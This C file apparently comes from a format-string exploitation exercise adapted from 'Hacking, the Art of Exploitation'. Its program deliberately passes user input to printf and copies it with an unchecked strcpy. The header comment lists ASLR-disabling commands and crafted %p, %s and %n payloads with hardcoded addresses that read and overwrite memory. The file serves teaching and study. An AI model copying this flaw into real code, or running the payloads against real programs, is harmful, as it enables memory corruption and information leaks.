/**
 * Adapted from Hacking, the Art of Exploitation by Jon Erickson
 * Turn off ASLR for a specific run
 * setarch `uname -m` -R ./getenvaddr PATH
 * setarch `uname -m` -R ./exploitable AAAAAAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%sAAAA$(printf "\x52\xee\xff\xff\xff\x7f")
 * setarch `uname -m` -R ./exploitable AAAAAAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%nAAAA$(printf "\x40\x10\x60")
 * setarch `uname -m` -R ./exploitable AAAAAAAA..%14\$s.$(printf "\x52\xee\xff\xff\xff\x7f")
 * setarch `uname -m` -R ./exploitable ..%13\$s.$(printf "\x52\xee\xff\xff\xff\x7f")
 * setarch `uname -m` -R ./exploitable %96x....%2\$n..%p..%p..%p..%p.$(printf "\x40\x10\x60")
 *
 *
 * setarch `uname -m` -R ./exploitable ..%13\$s.$(printf "\xd2\xe8\xff\xff\xff\x7f")
 *
 * setarch `uname -m` -R ./exploitable AAAAAAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%s$(printf "\x52\xee\xff\xff\xff\x7f")
 * setarch `uname -m` -R ./exploitable %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.AAAAA%p.%p.%s.AAAAAAAAA$(printf "\x52\xee\xff\xff\xff\x7f")
 * setarch `uname -m` -R ./exploitable %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%pAAAAAA%p.%p.%nAAAAAAAAAA$(printf "\x40\x10\x60")
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

int main(int argc, char * argv[]) {
  char text[1024];
  static int test_val = -72;

  if (argc < 2) {
    printf("Usage: %s <text to print>\n", argv[0]);
    exit(0);
  }

  strcpy(text, argv[1]);

  printf(text);
  printf("\n");

  printf("pointer 0x%016" PRIxPTR " \t decimal value %d \t hex value 0x%08x\n", (uintptr_t) &test_val, test_val, test_val);
}